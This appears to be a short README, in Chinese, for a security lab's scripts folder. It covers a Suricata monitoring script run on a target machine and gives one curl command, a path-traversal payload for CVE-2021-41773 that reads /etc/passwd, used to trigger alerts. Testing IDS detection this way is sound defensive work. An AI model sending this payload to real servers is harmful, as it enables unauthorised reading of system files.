# 腳本

- `watch_suricata.sh` — 在**靶機**上跑：更新 ET Open 規則、用指定網卡起 Suricata、盯 `fast.log` 的 alert。
  用法：`sudo ./watch_suricata.sh <網卡名>`（網卡名用 `ip a` 查，例如 `ens33`）。

攻擊流量不在這裡重造，直接用攻擊側套件的
`../../../sessions/20261002_attack-cve-2021-41773/scripts/01_test_traversal.sh`，或手打：

```
curl --path-as-is 'http://<靶機IP>/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'
```
